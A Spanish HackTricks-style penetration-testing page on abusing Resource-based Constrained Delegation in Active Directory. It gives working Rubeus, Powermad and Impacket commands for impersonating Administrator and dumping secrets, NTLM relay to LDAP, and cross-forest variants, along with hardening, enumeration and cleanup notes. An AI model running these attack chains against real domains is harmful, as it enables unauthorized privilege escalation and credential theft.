# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Conceptos básicos de Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) es similar a [constrained delegation](constrained-delegation.md), pero la dirección de confianza está invertida. La constrained delegation tradicional registra a qué servicios puede delegar un principal; RBCD registra en el **recurso objetivo** qué principales pueden impersonar usuarios en él.<sup>[[12]](#references)</sup>

El atributo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ del objeto objetivo contiene un security descriptor que identifica los principales autorizados a actuar en nombre de otras identidades en ese recurso.

Otra diferencia importante es que un principal con suficientes **permisos de escritura sobre una cuenta de máquina** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` y derechos similares) puede tener la capacidad de establecer _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Configurar la constrained delegation tradicional normalmente requiere un acceso administrativo con más privilegios.<sup>[[1]](#references)</sup>

Más precisamente, el cambio de la configuración de la constrained delegation clásica normalmente está controlado por `SeEnableDelegationPrivilege` en un domain controller, un derecho que suelen tener los administradores con muchos privilegios. RBCD traslada la decisión al security descriptor del objeto objetivo, por lo que el acceso de escritura a la propiedad relevante del objeto de equipo puede ser suficiente sin ese derecho de usuario.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuevos conceptos

El flag **`TrustedToAuthForDelegation`** en `userAccountControl` suele describirse como un prerrequisito para **S4U2Self**, pero esto es incompleto.\
Un service principal con un SPN puede solicitar S4U2Self sin el flag. Con `TrustedToAuthForDelegation`, el service ticket devuelto es **forwardable**; sin él, el ticket normalmente es **non-forwardable**.<sup>[[5]](#references)</sup>

La constrained delegation tradicional rechaza un **TGS non-forwardable** en el paso S4U2Proxy. RBCD puede aceptar ese ticket de S4U2Self cuando el security descriptor del objetivo autoriza al servicio solicitante.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Estructura del ataque

> Si tienes **privilegios equivalentes a escritura** sobre una **cuenta de equipo**, es posible que puedas obtener acceso privilegiado a esa máquina.

Supón que el atacante ya tiene **privilegios equivalentes a escritura sobre el objeto de equipo víctima**.

1. El atacante **compromete** una cuenta con un **SPN** o **crea una** ("Service A"). De forma predeterminada, un usuario autenticado del dominio puede crear hasta 10 objetos de equipo, según lo controlado por **_MachineAccountQuota_**; un objeto de equipo proporciona automáticamente SPNs utilizables.
2. El atacante **abusa de su privilegio WRITE** sobre el equipo víctima (ServiceB) para configurar resource-based constrained delegation y permitir que ServiceA impersonate a cualquier usuario contra ese equipo víctima (ServiceB).
3. El atacante utiliza Rubeus para realizar un **full S4U attack** (S4U2Self y S4U2Proxy) desde Service A hacia Service B para un usuario **con acceso privilegiado a Service B**.
1. S4U2Self (desde la cuenta SPN comprometida o creada): solicitar un **TGS que represente a Administrator hacia Service A** (non-forwardable).
2. S4U2Proxy: utilizar ese **TGS non-forwardable** para solicitar un service ticket que represente a **Administrator** hacia el **host víctima**.
3. El ticket non-forwardable todavía puede funcionar en este flujo de RBCD porque Service A está autorizado en el security descriptor del recurso objetivo.
4. El atacante puede hacer **pass-the-ticket** e **impersonate** al usuario para obtener **acceso al ServiceB** víctima.<sup>[[1]](#references)</sup>

Para comprobar el _**MachineAccountQuota**_ del dominio puedes utilizar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Crear un objeto de equipo

Puedes crear un objeto de equipo dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuración de Resource-based Constrained Delegation

**Uso del módulo de PowerShell de Active Directory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Uso de powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realización de un ataque S4U completo (Windows/Rubeus)

En primer lugar, creamos el nuevo objeto Computer con la contraseña `123456`, por lo que necesitamos el hash de esa contraseña:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES de esa cuenta.\
Ahora, se puede realizar el ataque:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets para más servicios con una sola solicitud usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Los usuarios pueden marcarse como **"La cuenta es confidencial y no puede delegarse."** Si esa marca está habilitada, la cuenta no puede suplantarse mediante este flujo de delegación. BloodHound expone esta propiedad durante el análisis.

### Herramientas de Linux: RBCD de extremo a extremo con Impacket (2024+)

Si operas desde Linux, puedes realizar la cadena completa de RBCD usando las herramientas oficiales de Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Si el LDAP signing/LDAPS está enforced, usa `impacket-rbcd -use-ldaps ...`.
- Prefiere claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus admiten ambos flujos usando únicamente AES.
- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtén el SPN correcto siempre que sea posible (por ejemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD entre dominios y entre forests

Si el **delegating principal** que controlas vive en un **dominio diferente** (o incluso en un **forest diferente**) al del **resource computer**, el abuso sigue siendo **RBCD**, pero el flujo de tickets ya no es el habitual `S4U2Self -> S4U2Proxy` de un único dominio.

### RBCD entre dominios: configura el foreign principal mediante su SID

Cuando estableces `msDS-AllowedToActOnBehalfOfOtherIdentity` desde un **dominio diferente**, es posible que la máquina/usuario foreign **no pueda resolverse por nombre** en el LDAP del dominio objetivo. En ese caso, configura la entrada de delegación usando el **SID** del foreign principal en lugar de su sAMAccountName/UPN.

Esto es especialmente relevante al hacer relay de NTLM a LDAP con `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notas:
- `--sid` indica a `ntlmrelayx.py` que trate `--escalate-user` como un SID, lo cual es necesario cuando la cuenta delegante es externa al dominio de destino.
- Aunque la herramienta muestre `User not found in LDAP`, la escritura de la delegación aún puede tener éxito porque el descriptor de seguridad almacena directamente el SID externo.

### RBCD entre dominios: secuencia S4U cross-realm

Una vez que la entidad principal externa está en `msDS-AllowedToActOnBehalfOfOtherIdentity`, el flujo cross-domain operativo es:<sup>[[9]](#references)[[13]](#references)</sup>

1. Obtener un **TGT** para la entidad principal delegante desde su propio dominio.
2. Solicitar un **TGT de referral** para `krbtgt/<target-domain>`.
3. Solicitar un **referral S4U2Self cross-realm** para el usuario suplantado en el DC del dominio de destino.
4. Solicitar el ticket **S4U2Self** real para ese usuario de vuelta en el dominio delegante.
5. Realizar **S4U2Proxy** en el dominio delegante para obtener un ticket de referral para el dominio de destino.
6. Realizar el **S4U2Proxy** final en el DC del dominio de destino para obtener el service ticket para `cifs/host.target`, `host/host.target`, etc.

Por esto, las herramientas Linux estándar suelen fallar con RBCD cross-domain:<sup>[[9]](#references)</sup>
- el **realm** de la solicitud puede tener que ser diferente del realm del TGT utilizado en el `TGS-REQ`
- la cadena necesita **pasos S4U2Proxy independientes**, no solo `S4U2Self` ni `S4U2Self` seguido inmediatamente de un único `S4U2Proxy`

### RBCD entre dominios desde Linux

Synacktiv publicó una implementación de `getST.py` para Impacket que reproduce la secuencia cross-realm desde Linux gestionando explícitamente los dos KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativamente, los nuevos argumentos son:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del **resource computer**
- `-targetdc`: DC del dominio del **resource**

### Limitaciones de RBCD entre bosques

RBCD entre bosques tiene una limitación importante: **el usuario suplantado debe pertenecer al mismo bosque que el principal delegante**. En otras palabras, si tu machine account controlada está en `valhalla.local` y el resource target está en `asgard.local`, generalmente **no puedes suplantar usuarios arbitrarios de `asgard.local`** hacia ese resource mediante RBCD.<sup>[[9]](#references)</sup>

Sigue siendo explotable cuando:
- el usuario del **bosque delegante** es **administrador local** (o tiene privilegios equivalentes) en el resource host del otro bosque
- un trust permite la ruta de autenticación requerida y el SID extranjero es aceptado en el security descriptor del equipo objetivo

### Particularidades del protocolo RBCD entre bosques

RBCD entre bosques no es simplemente "entre dominios con un trust". El flujo observado incluye dos particularidades que las herramientas habituales históricamente omiten:<sup>[[9]](#references)</sup>

1. Una solicitud adicional de **S4U2Proxy** que establece **`PA-PAC-OPTIONS=branch-aware`**
2. Un service ticket final que puede devolverse mediante **RC4**, incluso cuando se solicitaron otros etypes

El flujo práctico es:

1. Obtener un TGT para el principal delegante en el forest A.
2. Solicitar **S4U2Self** para el usuario suplantado en el forest A.
3. Solicitar **S4U2Proxy** en el forest A para obtener un referral TGT para el forest B.
4. Enviar un segundo **S4U2Proxy** en el forest A **sin el ticket de S4U2Self como additional ticket**, pero con `branch-aware` habilitado, para obtener otro referral TGT para el forest B.
5. Solicitar opcionalmente un service ticket normal en el forest B para el principal delegante (este ticket no es necesario para el abuso final).
6. Usar los referral tickets de los pasos 3 y 4 para solicitar el ticket final de **S4U2Proxy** en el forest B para el usuario del forest A suplantado, dirigido al SPN objetivo.

### RBCD entre bosques desde Linux

La misma rama de Synacktiv Impacket añade un switch `-forest` para esta lógica:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

En los **multi-domain forests**, tanto **S4U2Self** como **S4U2Proxy** pueden ser **recursivos** en lugar de detenerse después de una referral:

- **Recursive S4U2Self**: el primer `S4U2Self` se envía al **dominio del usuario suplantado**, los saltos intermedios entre dominios padre/hijo se recorren mediante referrals `TGS-REQ` normales para `krbtgt/<REALM>`, y el **`S4U2Self` final** se envía en el **propio dominio del delegating principal**.
- Esto significa que **tener únicamente un TGT** para una cuenta de máquina puede ser suficiente para suplantar a un **administrador de otro dominio del mismo forest** y solicitar `cifs/host`, `host/host`, `wsman/host`, etc.
- **Recursive S4U2Proxy** sigue la cadena de trust de la misma forma: los saltos intermedios reutilizan el ticket anterior como TGT mientras solicitan la siguiente referral de `krbtgt/<REALM>`, y solo el último salto devuelve el service ticket final.<sup>[[10]](#references)</sup>

Un ejemplo práctico dentro del mismo forest es:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD sin SPN entre dominios / bosques

Si el **principal delegante es un usuario sin un SPN**, el último `S4U2Self` recursivo falla con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La solución alternativa consiste en **reintentar únicamente el salto final como `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versión corta de la cadena de abuso:

1. Autenticarse con el **hash NT** para que el KDC utilice **RC4-HMAC (etype 23)**.
2. Solicitar primero **`-self -u2u`** y mantener ese ticket separado del proxy posterior.
3. Extraer la clave de sesión del **TGT** con `describeTicket.py`.
4. Reemplazar el **hash NT** del usuario por esa **clave de sesión** usando `changepasswd.py -newhashes <session_key>`.
5. Reutilizar el ticket `S4U2Self+U2U` como **`-additional-ticket`** durante una solicitud **`-proxy`** independiente.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Consideraciones operativas:

- Cuando el **primer salto de confianza ya es otro forest**, prioriza el algoritmo **branch-aware** (`getST.py ... -forest`) para coincidir con el comportamiento nativo de Windows. Si el forest externo solo se alcanza **más adelante** en la cadena, el flujo recursivo no branch-aware todavía puede funcionar.<sup>[[9]](#references)</sup>
- En DCs recientes de **Windows Server 2022/2025**, forzar RC4 puede fallar con **`KDC_ERR_ETYPE_NOSUPP`** debido a la obsolescencia de RC4; esto puede hacer que **SPN-less RBCD sea imposible**, aunque el RBCD clásico basado en SPN siga funcionando con AES.<sup>[[15]](#references)</sup>
- Ejecuta **`S4U2Self+U2U` antes de cambiar el hash/contraseña del usuario**: `SamrChangePasswordUser` **no** vuelve a calcular las claves AES de Kerberos de la cuenta, por lo que cambiar primero la contraseña puede romper las solicitudes posteriores de tickets.<sup>[[14]](#references)</sup>
- La cuenta suplantada debe seguir siendo **delegable**: **Protected Users** y las cuentas con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloquean la cadena.

## Notas de detección / hardening

- Los paths de RBCD entre dominios/forests normalmente todavía se crean mediante **abuso de ACL** o **relay-to-LDAP**. Aplica **LDAP signing** y **LDAP channel binding** en los DCs para romper las rutas de configuración habituales.
- Audita quién puede escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en objetos de equipo y resuelve los SID almacenados, incluidos los **foreign security principals**.
- En entornos con muchos trusts, revisa **Selective Authentication**, **SID filtering** y si los usuarios de un forest externo tienen privilegios de **local admin** en los hosts de recursos.

### Acceso

La última línea de comandos realizará el **ataque S4U completo e inyectará el TGS** de Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** de Administrator, por lo que podrás acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes service tickets

Obtén más información sobre los [**service tickets disponibles aquí**](silver-ticket.md#available-services).

## Enumeración, auditoría y limpieza

### Enumerar equipos con RBCD configurado

PowerShell (decodificando el SD para resolver los SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leer o vaciar con un comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpieza / restablecimiento de RBCD

- PowerShell (borrar el atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o proporciona los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` para un usuario normal: el principal delegante probablemente **no tiene SPN**. Reintenta el **último salto** como **`S4U2Self+U2U`** en lugar de un `S4U2Self` normal.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante **SPN-less RBCD**: los DC recientes pueden rechazar la ruta **RC4-HMAC** forzada requerida por el truco de **`S4U2Self+U2U` + sustitución de la clave de sesión**. Prueba en su lugar una ruta RBCD clásica **respaldada por SPN** con AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual es diferente de la del DC y kerberos no está funcionando correctamente.
- **`preauth_failed`**: Esto significa que el nombre de usuario y los hashes proporcionados no funcionan para iniciar sesión. Es posible que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Esto puede significar:
- El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
- El servicio solicitado no existe (si solicitas un ticket para winrm pero winrm no está ejecutándose)
- El fakecomputer creado ha perdido sus privilegios sobre el servidor vulnerable y debes devolvérselos.
- Estás abusando de KCD clásico; recuerda que RBCD funciona con tickets S4U2Self no reenviables, mientras que KCD requiere que sean reenviables.

## Notas, relays y alternativas

- También puedes escribir el RBCD SD mediante AD Web Services (ADWS) si LDAP está filtrado. Consulta:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Las cadenas de Kerberos relay suelen terminar en RBCD para obtener SYSTEM local en un solo paso. Consulta ejemplos prácticos de extremo a extremo:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si LDAP signing/channel binding están **deshabilitados** y puedes crear una cuenta de máquina, herramientas como **`KrbRelayUp`** pueden retransmitir una autenticación Kerberos forzada hacia LDAP, establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` para tu cuenta de máquina en el objeto de equipo objetivo e suplantar inmediatamente a **`Administrator`** mediante S4U desde fuera del host.<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
